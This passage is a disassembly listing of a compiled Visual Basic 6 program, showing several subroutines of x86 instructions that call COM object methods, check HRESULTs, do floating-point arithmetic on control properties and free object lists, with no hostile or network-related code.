00885971: mov var_00000288, eax
00885977: jmp 885980h
00885979: and var_00000288, 00000000h
00885980: mov eax, [ebp+08h]
00885983: mov eax, [eax]
00885985: push [ebp+08h]
00885988: call [eax+0000031Ch]
0088598E: push eax
0088598F: lea eax, var_34
00885992: push eax
00885993: call 00410A84h ; Set (object)
00885998: mov var_00000108, eax
0088599E: lea eax, var_000000F0
008859A4: push eax
008859A5: mov eax, var_00000108
008859AB: mov eax, [eax]
008859AD: push var_00000108
008859B3: call [eax+00000080h]
008859B9: fclex 
008859BB: mov var_0000010C, eax
008859C1: cmp var_0000010C, 00000000h
008859C8: jnl 8859EDh
008859CA: push 00000080h
008859CF: push 004425E4h
008859D4: push var_00000108
008859DA: push var_0000010C
008859E0: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008859E5: mov var_0000028C, eax
008859EB: jmp 8859F4h
008859ED: and var_0000028C, 00000000h
008859F4: mov eax, [ebp+08h]
008859F7: mov eax, [eax]
008859F9: push [ebp+08h]
008859FC: call [eax+0000031Ch]
00885A02: push eax
00885A03: lea eax, var_38
00885A06: push eax
00885A07: call 00410A84h ; Set (object)
00885A0C: mov var_00000110, eax
00885A12: lea eax, var_000000F4
00885A18: push eax
00885A19: mov eax, var_00000110
00885A1F: mov eax, [eax]
00885A21: push var_00000110
00885A27: call [eax+78h]
00885A2A: fclex 
00885A2C: mov var_00000114, eax
00885A32: cmp var_00000114, 00000000h
00885A39: jnl 885A5Bh
00885A3B: push 00000078h
00885A3D: push 004425E4h
00885A42: push var_00000110
00885A48: push var_00000114
00885A4E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00885A53: mov var_00000290, eax
00885A59: jmp 885A62h
00885A5B: and var_00000290, 00000000h
00885A62: mov eax, [ebp+08h]
00885A65: mov eax, [eax]
00885A67: push [ebp+08h]
00885A6A: call [eax+00000310h]
00885A70: push eax
00885A71: lea eax, var_3C
00885A74: push eax
00885A75: call 00410A84h ; Set (object)
00885A7A: mov var_00000118, eax
00885A80: mov var_0000008C, 80020004h
00885A8A: mov var_00000094, 0000000Ah
00885A94: mov var_7C, 80020004h
00885A9B: mov var_00000084, 0000000Ah
00885AA5: fld real4 ptr var_000000F4
00885AAB: fstp real4 ptr var_6C
00885AAE: mov var_74, 00000004h
00885AB5: push 00000010h
00885AB7: pop eax
00885AB8: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00885ABD: lea esi, var_00000094
00885AC3: mov edi, esp
00885AC5: movsd 
00885AC6: movsd 
00885AC7: movsd 
00885AC8: movsd 
00885AC9: push 00000010h
00885ACB: pop eax
00885ACC: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00885AD1: lea esi, var_00000084
00885AD7: mov edi, esp
00885AD9: movsd 
00885ADA: movsd 
00885ADB: movsd 
00885ADC: movsd 
00885ADD: push 00000010h
00885ADF: pop eax
00885AE0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00885AE5: lea esi, var_74
00885AE8: mov edi, esp
00885AEA: movsd 
00885AEB: movsd 
00885AEC: movsd 
00885AED: movsd 
00885AEE: fld real4 ptr var_000000EC
00885AF4: fadd real4 ptr var_000000F0
00885AFA: fstsw ax
00885AFC: test al, 0Dh
00885AFE: jnz 00885FC1h
00885B04: push ecx
00885B05: fstp real4 ptr [esp]
00885B08: mov eax, var_00000118
00885B0E: mov eax, [eax]
00885B10: push var_00000118
00885B16: call [eax+000001D0h]
00885B1C: fclex 
00885B1E: mov var_0000011C, eax
00885B24: cmp var_0000011C, 00000000h
00885B2B: jnl 885B50h
00885B2D: push 000001D0h
00885B32: push 004425E4h
00885B37: push var_00000118
00885B3D: push var_0000011C
00885B43: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00885B48: mov var_00000294, eax
00885B4E: jmp 885B57h
00885B50: and var_00000294, 00000000h
00885B57: lea eax, var_3C
00885B5A: push eax
00885B5B: lea eax, var_38
00885B5E: push eax
00885B5F: lea eax, var_34
00885B62: push eax
00885B63: lea eax, var_30
00885B66: push eax
00885B67: push 00000004h
00885B69: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00885B6E: add esp, 00000014h
00885B71: mov var_04, 00000019h
00885B78: mov eax, [ebp+08h]
00885B7B: mov eax, [eax]
00885B7D: push [ebp+08h]
00885B80: call [eax+000002FCh]
00885B86: push eax
00885B87: lea eax, var_30
00885B8A: push eax
00885B8B: call 00410A84h ; Set (object)
00885B90: mov var_00000100, eax
00885B96: lea eax, var_000000EC
00885B9C: push eax
00885B9D: mov eax, var_00000100
00885BA3: mov eax, [eax]
00885BA5: push var_00000100
00885BAB: call [eax+70h]
00885BAE: fclex 
00885BB0: mov var_00000104, eax
00885BB6: cmp var_00000104, 00000000h
00885BBD: jnl 885BDFh
00885BBF: push 00000070h
00885BC1: push 00440EDCh
00885BC6: push var_00000100
00885BCC: push var_00000104
00885BD2: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00885BD7: mov var_00000298, eax
00885BDD: jmp 885BE6h
00885BDF: and var_00000298, 00000000h
00885BE6: lea eax, var_000000F0
00885BEC: push eax
00885BED: mov eax, [ebp+08h]
00885BF0: mov eax, [eax]
00885BF2: push [ebp+08h]
00885BF5: call [eax+00000088h]
00885BFB: fclex 
00885BFD: mov var_00000108, eax
00885C03: cmp var_00000108, 00000000h
00885C0A: jnl 885C2Ch
00885C0C: push 00000088h
00885C11: push 00441814h
00885C16: push [ebp+08h]
00885C19: push var_00000108
00885C1F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00885C24: mov var_0000029C, eax
00885C2A: jmp 885C33h
00885C2C: and var_0000029C, 00000000h
00885C33: cmp [008F529Ch], 00000000h
00885C3A: jnz 885C57h
00885C3C: push 008F529Ch
00885C41: push 00440F2Ch
00885C46: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00885C4B: mov var_000002A0, 008F529Ch
00885C55: jmp 885C61h
00885C57: mov var_000002A0, 008F529Ch
00885C61: mov eax, var_000002A0
00885C67: mov eax, [eax]
00885C69: mov var_0000010C, eax
00885C6F: lea eax, var_34
00885C72: push eax
00885C73: mov eax, var_0000010C
00885C79: mov eax, [eax]
00885C7B: push var_0000010C
00885C81: call [eax+18h]
00885C84: fclex 
00885C86: mov var_00000110, eax
00885C8C: cmp var_00000110, 00000000h
00885C93: jnl 885CB5h
00885C95: push 00000018h
00885C97: push 00440F1Ch
00885C9C: push var_0000010C
00885CA2: push var_00000110
00885CA8: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00885CAD: mov var_000002A4, eax
00885CB3: jmp 885CBCh
00885CB5: and var_000002A4, 00000000h
00885CBC: mov eax, var_34
00885CBF: mov var_00000114, eax
00885CC5: lea eax, var_000000F4
00885CCB: push eax
00885CCC: mov eax, var_00000114
00885CD2: mov eax, [eax]
00885CD4: push var_00000114
00885CDA: call [eax+00000088h]
00885CE0: fclex 
00885CE2: mov var_00000118, eax
00885CE8: cmp var_00000118, 00000000h
00885CEF: jnl 885D14h
00885CF1: push 00000088h
00885CF6: push 0044C888h
00885CFB: push var_00000114
00885D01: push var_00000118
00885D07: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00885D0C: mov var_000002A8, eax
00885D12: jmp 885D1Bh
00885D14: and var_000002A8, 00000000h
00885D1B: mov eax, [ebp+08h]
00885D1E: mov eax, [eax]
00885D20: push [ebp+08h]
00885D23: call [eax+00000324h]
00885D29: push eax
00885D2A: lea eax, var_38
00885D2D: push eax
00885D2E: call 00410A84h ; Set (object)
00885D33: mov var_0000011C, eax
00885D39: lea eax, var_000000F8
00885D3F: push eax
00885D40: mov eax, var_0000011C
00885D46: mov eax, [eax]
00885D48: push var_0000011C
00885D4E: call [eax+00000088h]
00885D54: fclex 
00885D56: mov var_00000120, eax
00885D5C: cmp var_00000120, 00000000h
00885D63: jnl 885D88h
00885D65: push 00000088h
00885D6A: push 004425E4h
00885D6F: push var_0000011C
00885D75: push var_00000120
00885D7B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00885D80: mov var_000002AC, eax
00885D86: jmp 885D8Fh
00885D88: and var_000002AC, 00000000h
00885D8F: mov eax, [ebp+08h]
00885D92: mov eax, [eax]
00885D94: push [ebp+08h]
00885D97: call [eax+000002FCh]
00885D9D: push eax
00885D9E: lea eax, var_3C
00885DA1: push eax
00885DA2: call 00410A84h ; Set (object)
00885DA7: mov var_00000124, eax
00885DAD: lea eax, var_000000FC
00885DB3: push eax
00885DB4: mov eax, var_00000124
00885DBA: mov eax, [eax]
00885DBC: push var_00000124
00885DC2: call [eax+78h]
00885DC5: fclex 
00885DC7: mov var_00000128, eax
00885DCD: cmp var_00000128, 00000000h
00885DD4: jnl 885DF6h
00885DD6: push 00000078h
00885DD8: push 00440EDCh
00885DDD: push var_00000124
00885DE3: push var_00000128
00885DE9: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00885DEE: mov var_000002B0, eax
00885DF4: jmp 885DFDh
00885DF6: and var_000002B0, 00000000h
00885DFD: mov eax, [ebp+08h]
00885E00: mov eax, [eax]
00885E02: push [ebp+08h]
00885E05: call [eax+00000324h]
00885E0B: push eax
00885E0C: lea eax, var_40
00885E0F: push eax
00885E10: call 00410A84h ; Set (object)
00885E15: mov var_0000012C, eax
00885E1B: mov var_0000008C, 80020004h
00885E25: mov var_00000094, 0000000Ah
00885E2F: mov var_7C, 80020004h
00885E36: mov var_00000084, 0000000Ah
00885E40: fld real4 ptr var_000000F0
00885E46: cmp [008F2000h], 00000000h
00885E4D: jnz 885E57h
00885E4F: fdiv real4 ptr var_000000F4
00885E55: jmp 885E62h
00885E57: push var_000000F4
00885E5D: call 004106B8h ; msvbvm60.dll._adj_fdiv_m32
00885E62: fsub real4 ptr var_000000F8
00885E68: fstsw ax
00885E6A: test al, 0Dh
00885E6C: jnz 00885FC1h
00885E72: fld real4 ptr var_000000FC
00885E78: fabs 
00885E7A: faddp st(1), st(0)
00885E7C: fsub real8 ptr [0040DC60h]
00885E82: fstp real4 ptr var_6C
00885E85: fstsw ax
00885E87: test al, 0Dh
00885E89: jnz 00885FC1h
00885E8F: mov var_74, 00000004h
00885E96: push 00000010h
00885E98: pop eax
00885E99: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00885E9E: lea esi, var_00000094
00885EA4: mov edi, esp
00885EA6: movsd 
00885EA7: movsd 
00885EA8: movsd 
00885EA9: movsd 
00885EAA: push 00000010h
00885EAC: pop eax
00885EAD: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00885EB2: lea esi, var_00000084
00885EB8: mov edi, esp
00885EBA: movsd 
00885EBB: movsd 
00885EBC: movsd 
00885EBD: movsd 
00885EBE: push 00000010h
00885EC0: pop eax
00885EC1: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00885EC6: lea esi, var_74
00885EC9: mov edi, esp
00885ECB: movsd 
00885ECC: movsd 
00885ECD: movsd 
00885ECE: movsd 
00885ECF: fld real4 ptr var_000000EC
00885ED5: fabs 
00885ED7: fadd real8 ptr [00407140h]
00885EDD: fstsw ax
00885EDF: test al, 0Dh
00885EE1: jnz 00885FC1h
00885EE7: fstp real4 ptr var_000002B4
00885EED: fld real4 ptr var_000002B4
00885EF3: push ecx
00885EF4: fstp real4 ptr [esp]
00885EF7: mov eax, var_0000012C
00885EFD: mov eax, [eax]
00885EFF: push var_0000012C
00885F05: call [eax+000001D0h]
00885F0B: fclex 
00885F0D: mov var_00000130, eax
00885F13: cmp var_00000130, 00000000h
00885F1A: jnl 885F3Fh
00885F1C: push 000001D0h
00885F21: push 004425E4h
00885F26: push var_0000012C
00885F2C: push var_00000130
00885F32: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00885F37: mov var_000002B8, eax
00885F3D: jmp 885F46h
00885F3F: and var_000002B8, 00000000h
00885F46: lea eax, var_40
00885F49: push eax
00885F4A: lea eax, var_3C
00885F4D: push eax
00885F4E: lea eax, var_38
00885F51: push eax
00885F52: lea eax, var_34
00885F55: push eax
00885F56: lea eax, var_30
00885F59: push eax
00885F5A: push 00000005h
00885F5C: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00885F61: add esp, 00000018h
00885F64: wait 
00885F65: push 00885FA2h
00885F6A: jmp 885FA1h
00885F6C: lea eax, var_44
00885F6F: push eax
00885F70: lea eax, var_40
00885F73: push eax
00885F74: lea eax, var_3C
00885F77: push eax
00885F78: lea eax, var_38
00885F7B: push eax
00885F7C: lea eax, var_34
00885F7F: push eax
00885F80: lea eax, var_30
00885F83: push eax
00885F84: push 00000006h
00885F86: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00885F8B: add esp, 0000001Ch
00885F8E: lea eax, var_64
00885F91: push eax
00885F92: lea eax, var_54
00885F95: push eax
00885F96: push 00000002h
00885F98: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00885F9D: add esp, 0000000Ch
00885FA0: ret 
End Sub

Private sub unknown_885FCB
00885FCB: push ebp
00885FCC: mov ebp, esp
00885FCE: sub esp, 00000018h
00885FD1: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00885FD6: mov eax, fs:[00h]
00885FDC: push eax
00885FDD: mov fs:[00000000h], esp
00885FE4: mov eax, 00000084h
00885FE9: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00885FEE: push ebx
00885FEF: push esi
00885FF0: push edi
00885FF1: mov var_18, esp
00885FF4: mov var_14, 0040DC70h
00885FFB: mov var_10, 00000000h
00886002: mov var_0C, 00000000h
00886009: mov eax, [ebp+08h]
0088600C: mov eax, [eax]
0088600E: push [ebp+08h]
00886011: call [eax+04h]
00886014: mov var_04, 00000001h
0088601B: mov var_04, 00000002h
00886022: push FFFFFFFFh
00886024: call 00410A60h ; On Error ...
00886029: mov var_04, 00000003h
00886030: mov eax, [ebp+10h]
00886033: cmp word ptr [eax], FFFFh
00886037: jnz 008862C8h
0088603D: mov var_04, 00000004h
00886044: mov eax, [ebp+08h]
00886047: mov eax, [eax]
00886049: push [ebp+08h]
0088604C: call [eax+00000308h]
00886052: push eax
00886053: lea eax, var_28
00886056: push eax
00886057: call 00410A84h ; Set (object)
0088605C: mov var_38, eax
0088605F: lea eax, var_34
00886062: push eax
00886063: mov eax, var_38
00886066: mov eax, [eax]
00886068: push var_38
0088606B: call [eax+48h]
0088606E: fclex 
00886070: mov var_3C, eax
00886073: cmp var_3C, 00000000h
00886077: jnl 886090h
00886079: push 00000048h
0088607B: push 00440DE8h
00886080: push var_38
00886083: push var_3C
00886086: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0088608B: mov var_74, eax
0088608E: jmp 886094h
00886090: and var_74, 00000000h
00886094: movsx eax, word ptr var_34
00886098: mov var_4C, eax
0088609B: mov var_48, 00000001h
008860A2: mov var_24, 00000001h
008860A9: lea ecx, var_28
008860AC: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008860B1: jmp 8860C2h
008860B3: mov eax, var_24
008860B6: add eax, var_48
008860B9: jo 00886504h
008860BF: mov var_24, eax
008860C2: mov eax, var_24
008860C5: cmp eax, var_4C
008860C8: jnle 008862C3h
008860CE: mov var_04, 00000005h
008860D5: cmp [008F529Ch], 00000000h
008860DC: jnz 8860F6h
008860DE: push 008F529Ch
008860E3: push 00440F2Ch
008860E8: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008860ED: mov var_78, 008F529Ch
008860F4: jmp 8860FDh
008860F6: mov var_78, 008F529Ch
008860FD: mov eax, var_78
00886100: mov eax, [eax]
00886102: mov var_40, eax
00886105: mov eax, [ebp+08h]
00886108: mov eax, [eax]
0088610A: push [ebp+08h]
0088610D: call [eax+00000308h]
00886113: push eax
00886114: lea eax, var_28
00886117: push eax
00886118: call 00410A84h ; Set (object)
0088611D: mov var_38, eax
00886120: lea eax, var_2C
00886123: push eax
00886124: mov ecx, var_24
00886127: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0088612C: push eax
0088612D: mov eax, var_38
00886130: mov eax, [eax]
00886132: push var_38
00886135: call [eax+40h]
00886138: fclex 
0088613A: mov var_3C, eax
0088613D: cmp var_3C, 00000000h
00886141: jnl 88615Ah
00886143: push 00000040h
00886145: push 00440DE8h
0088614A: push var_38
0088614D: push var_3C
00886150: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00886155: mov var_7C, eax
00886158: jmp 88615Eh
0088615A: and var_7C, 00000000h
0088615E: mov eax, var_2C
00886161: mov var_64, eax
00886164: and var_2C, 00000000h
00886168: push var_64
0088616B: lea eax, var_30
0088616E: push eax
0088616F: call 00410A84h ; Set (object)
00886174: push eax
00886175: mov eax, var_40
00886178: mov eax, [eax]
0088617A: push var_40
0088617D: call [eax+10h]
00886180: fclex 
00886182: mov var_44, eax
00886185: cmp var_44, 00000000h
00886189: jnl 8861A2h
0088618B: push 00000010h
0088618D: push 00440F1Ch
00886192: push var_40
00886195: push var_44
00886198: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0088619D: mov var_80, eax
008861A0: jmp 8861A6h
008861A2: and var_80, 00000000h
008861A6: lea eax, var_30
008861A9: push eax
008861AA: lea eax, var_28
008861AD: push eax
008861AE: push 00000002h
008861B0: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008861B5: add esp, 0000000Ch
008861B8: mov var_04, 00000006h
008861BF: cmp [008F529Ch], 00000000h
008861C6: jnz 8861E3h
008861C8: push 008F529Ch
008861CD: push 00440F2Ch
008861D2: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008861D7: mov var_00000084, 008F529Ch
008861E1: jmp 8861EDh
008861E3: mov var_00000084, 008F529Ch
008861ED: mov eax, var_00000084
008861F3: mov eax, [eax]
008861F5: mov var_40, eax
008861F8: mov eax, [ebp+08h]
008861FB: mov eax, [eax]
008861FD: push [ebp+08h]
00886200: call [eax+00000314h]
00886206: push eax
00886207: lea eax, var_28
0088620A: push eax
0088620B: call 00410A84h ; Set (object)
00886210: mov var_38, eax
00886213: lea eax, var_2C
00886216: push eax
00886217: mov ecx, var_24
0088621A: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0088621F: push eax
00886220: mov eax, var_38
00886223: mov eax, [eax]
00886225: push var_38
00886228: call [eax+40h]
0088622B: fclex 
0088622D: mov var_3C, eax
00886230: cmp var_3C, 00000000h
00886234: jnl 886250h
00886236: push 00000040h
00886238: push 00440DE8h
0088623D: push var_38
00886240: push var_3C
00886243: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00886248: mov var_00000088, eax
0088624E: jmp 886257h
00886250: and var_00000088, 00000000h
00886257: mov eax, var_2C
0088625A: mov var_68, eax
0088625D: and var_2C, 00000000h
00886261: push var_68
00886264: lea eax, var_30
00886267: push eax
00886268: call 00410A84h ; Set (object)
0088626D: push eax
0088626E: mov eax, var_40
00886271: mov eax, [eax]
00886273: push var_40
00886276: call [eax+10h]
00886279: fclex 
0088627B: mov var_44, eax
0088627E: cmp var_44, 00000000h
00886282: jnl 88629Eh
00886284: push 00000010h
00886286: push 00440F1Ch
0088628B: push var_40
0088628E: push var_44
00886291: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00886296: mov var_0000008C, eax
0088629C: jmp 8862A5h
0088629E: and var_0000008C, 00000000h
008862A5: lea eax, var_30
008862A8: push eax
008862A9: lea eax, var_28
008862AC: push eax
008862AD: push 00000002h
008862AF: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008862B4: add esp, 0000000Ch
008862B7: mov var_04, 00000007h
008862BE: jmp 008860B3h
008862C3: jmp 008864C6h
008862C8: mov var_04, 00000009h
008862CF: cmp [008F529Ch], 00000000h
008862D6: jnz 8862F3h
008862D8: push 008F529Ch
008862DD: push 00440F2Ch
008862E2: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008862E7: mov var_00000090, 008F529Ch
008862F1: jmp 8862FDh
008862F3: mov var_00000090, 008F529Ch
008862FD: mov eax, var_00000090
00886303: mov eax, [eax]
00886305: mov var_40, eax
00886308: mov eax, [ebp+08h]
0088630B: mov eax, [eax]
0088630D: push [ebp+08h]
00886310: call [eax+00000308h]
00886316: push eax
00886317: lea eax, var_28
0088631A: push eax
0088631B: call 00410A84h ; Set (object)
00886320: mov var_38, eax
00886323: lea eax, var_2C
00886326: push eax
00886327: mov ecx, [ebp+0Ch]
0088632A: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0088632F: push eax
00886330: mov eax, var_38
00886333: mov eax, [eax]
00886335: push var_38
00886338: call [eax+40h]
0088633B: fclex 
0088633D: mov var_3C, eax
00886340: cmp var_3C, 00000000h
00886344: jnl 886360h
00886346: push 00000040h
00886348: push 00440DE8h
0088634D: push var_38
00886350: push var_3C
00886353: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00886358: mov var_00000094, eax
0088635E: jmp 886367h
00886360: and var_00000094, 00000000h
00886367: mov eax, var_2C
0088636A: mov var_6C, eax
0088636D: and var_2C, 00000000h
00886371: push var_6C
00886374: lea eax, var_30
00886377: push eax
00886378: call 00410A84h ; Set (object)
0088637D: push eax
0088637E: mov eax, var_40
00886381: mov eax, [eax]
00886383: push var_40
00886386: call [eax+10h]
00886389: fclex 
0088638B: mov var_44, eax
0088638E: cmp var_44, 00000000h
00886392: jnl 8863AEh
00886394: push 00000010h
00886396: push 00440F1Ch
0088639B: push var_40
0088639E: push var_44
008863A1: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008863A6: mov var_00000098, eax
008863AC: jmp 8863B5h
008863AE: and var_00000098, 00000000h
008863B5: lea eax, var_30
008863B8: push eax
008863B9: lea eax, var_28
008863BC: push eax
008863BD: push 00000002h
008863BF: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008863C4: add esp, 0000000Ch
008863C7: mov var_04, 0000000Ah
008863CE: cmp [008F529Ch], 00000000h
008863D5: jnz 8863F2h
008863D7: push 008F529Ch
008863DC: push 00440F2Ch
008863E1: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008863E6: mov var_0000009C, 008F529Ch
008863F0: jmp 8863FCh
008863F2: mov var_0000009C, 008F529Ch
008863FC: mov eax, var_0000009C
00886402: mov eax, [eax]
00886404: mov var_40, eax
00886407: mov eax, [ebp+08h]
0088640A: mov eax, [eax]
0088640C: push [ebp+08h]
0088640F: call [eax+00000314h]
00886415: push eax
00886416: lea eax, var_28
00886419: push eax
0088641A: call 00410A84h ; Set (object)
0088641F: mov var_38, eax
00886422: lea eax, var_2C
00886425: push eax
00886426: mov ecx, [ebp+0Ch]
00886429: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0088642E: push eax
0088642F: mov eax, var_38
00886432: mov eax, [eax]
00886434: push var_38
00886437: call [eax+40h]
0088643A: fclex 
0088643C: mov var_3C, eax
0088643F: cmp var_3C, 00000000h
00886443: jnl 88645Fh
00886445: push 00000040h
00886447: push 00440DE8h
0088644C: push var_38
0088644F: push var_3C
00886452: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00886457: mov var_000000A0, eax
0088645D: jmp 886466h
0088645F: and var_000000A0, 00000000h
00886466: mov eax, var_2C
00886469: mov var_70, eax
0088646C: and var_2C, 00000000h
00886470: push var_70
00886473: lea eax, var_30
00886476: push eax
00886477: call 00410A84h ; Set (object)
0088647C: push eax
0088647D: mov eax, var_40
00886480: mov eax, [eax]
00886482: push var_40
00886485: call [eax+10h]
00886488: fclex 
0088648A: mov var_44, eax
0088648D: cmp var_44, 00000000h
00886491: jnl 8864ADh
00886493: push 00000010h
00886495: push 00440F1Ch
0088649A: push var_40
0088649D: push var_44
008864A0: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008864A5: mov var_000000A4, eax
008864AB: jmp 8864B4h
008864AD: and var_000000A4, 00000000h
008864B4: lea eax, var_30
008864B7: push eax
008864B8: lea eax, var_28
008864BB: push eax
008864BC: push 00000002h
008864BE: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008864C3: add esp, 0000000Ch
008864C6: push 008864E5h
008864CB: jmp 8864E4h
008864CD: lea eax, var_30
008864D0: push eax
008864D1: lea eax, var_2C
008864D4: push eax
008864D5: lea eax, var_28
008864D8: push eax
008864D9: push 00000003h
008864DB: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008864E0: add esp, 00000010h
008864E3: ret 
End Sub

Private sub unknown_886509
00886509: push ebp
0088650A: mov ebp, esp
0088650C: sub esp, 0000000Ch
0088650F: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00886514: mov eax, fs:[00h]
0088651A: push eax
0088651B: mov fs:[00000000h], esp
00886522: push 00000034h
00886524: pop eax
00886525: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0088652A: push ebx
0088652B: push esi
0088652C: push edi
0088652D: mov var_0C, esp
00886530: mov var_08, 0040DCC0h
00886537: mov var_04, 00000000h
0088653E: mov eax, [ebp+08h]
00886541: mov eax, [eax]
00886543: push [ebp+08h]
00886546: call [eax+04h]
00886549: cmp [008F529Ch], 00000000h
00886550: jnz 88656Ah
00886552: push 008F529Ch
00886557: push 00440F2Ch
0088655C: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00886561: mov var_40, 008F529Ch
00886568: jmp 886571h
0088656A: mov var_40, 008F529Ch
00886571: mov eax, var_40
00886574: mov eax, [eax]
00886576: mov var_2C, eax
00886579: mov eax, [ebp+08h]
0088657C: mov eax, [eax]
0088657E: push [ebp+08h]
00886581: call [eax+0000030Ch]
00886587: push eax
00886588: lea eax, var_18
0088658B: push eax
0088658C: call 00410A84h ; Set (object)
00886591: mov var_24, eax
00886594: lea eax, var_1C
00886597: push eax
00886598: mov ecx, [ebp+0Ch]
0088659B: call 004108B0h ; msvbvm60.dll.__vbaI2I4
008865A0: push eax
008865A1: mov eax, var_24
008865A4: mov eax, [eax]
008865A6: push var_24
008865A9: call [eax+40h]
008865AC: fclex 
008865AE: mov var_28, eax
008865B1: cmp var_28, 00000000h
008865B5: jnl 8865CEh
008865B7: push 00000040h
008865B9: push 00440DE8h
008865BE: push var_24
008865C1: push var_28
008865C4: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008865C9: mov var_44, eax
008865CC: jmp 8865D2h
008865CE: and var_44, 00000000h
008865D2: mov eax, var_1C
008865D5: mov var_3C, eax
008865D8: and var_1C, 00000000h
008865DC: push var_3C
008865DF: lea eax, var_20
008865E2: push eax
008865E3: call 00410A84h ; Set (object)
008865E8: push eax
008865E9: mov eax, var_2C
008865EC: mov eax, [eax]
008865EE: push var_2C
008865F1: call [eax+10h]
008865F4: fclex 
008865F6: mov var_30, eax
008865F9: cmp var_30, 00000000h
008865FD: jnl 886616h
008865FF: push 00000010h
00886601: push 00440F1Ch
00886606: push var_2C
00886609: push var_30
0088660C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00886611: mov var_48, eax
00886614: jmp 88661Ah
00886616: and var_48, 00000000h
0088661A: lea eax, var_20
0088661D: push eax
0088661E: lea eax, var_18
00886621: push eax
00886622: push 00000002h
00886624: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00886629: add esp, 0000000Ch
0088662C: push 0088664Bh
00886631: jmp 88664Ah
00886633: lea eax, var_20
00886636: push eax
00886637: lea eax, var_1C
0088663A: push eax
0088663B: lea eax, var_18
0088663E: push eax
0088663F: push 00000003h
00886641: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00886646: add esp, 00000010h
00886649: ret 
End Sub

Private sub unknown_880404
00880404: push ebp
00880405: mov ebp, esp
00880407: sub esp, 00000018h
0088040A: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0088040F: mov eax, fs:[00h]
00880415: push eax
00880416: mov fs:[00000000h], esp
0088041D: mov eax, 000000B4h
00880422: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00880427: push ebx
00880428: push esi
00880429: push edi
0088042A: mov var_18, esp
0088042D: mov var_14, 0040D9E0h
00880434: mov var_10, 00000000h
0088043B: mov var_0C, 00000000h
00880442: mov var_04, 00000001h
00880449: mov var_04, 00000002h
00880450: push FFFFFFFFh
00880452: call 00410A60h ; On Error ...
00880457: mov var_04, 00000003h
0088045E: mov eax, [ebp+08h]
00880461: mov eax, [eax]
00880463: push [ebp+08h]
00880466: call [eax+000002FCh]
0088046C: push eax
0088046D: lea eax, var_48
00880470: push eax
00880471: call 00410A84h ; Set (object)
00880476: mov var_04, 00000004h
0088047D: mov eax, [ebp+08h]
00880480: mov eax, [eax]
00880482: push [ebp+08h]
00880485: call [eax+00000328h]
0088048B: push eax
0088048C: lea eax, var_24
0088048F: push eax
00880490: call 00410A84h ; Set (object)
00880495: mov var_34, eax
00880498: lea eax, var_30
0088049B: push eax
0088049C: mov eax, var_34
0088049F: mov eax, [eax]
008804A1: push var_34
008804A4: call [eax+00000108h]
008804AA: fclex 
008804AC: mov var_38, eax
008804AF: cmp var_38, 00000000h
008804B3: jnl 8804CFh
008804B5: push 00000108h
008804BA: push 00440EDCh
008804BF: push var_34
008804C2: push var_38
008804C5: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008804CA: mov var_60, eax
008804CD: jmp 8804D3h
008804CF: and var_60, 00000000h
008804D3: lea eax, var_2C
008804D6: push eax
008804D7: mov eax, var_48
008804DA: mov eax, [eax]
008804DC: push var_48
008804DF: call [eax+00000108h]
008804E5: fclex 
008804E7: mov var_3C, eax
008804EA: cmp var_3C, 00000000h
008804EE: jnl 88050Ah
008804F0: push 00000108h
008804F5: push 00440EDCh
008804FA: push var_48
008804FD: push var_3C
00880500: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
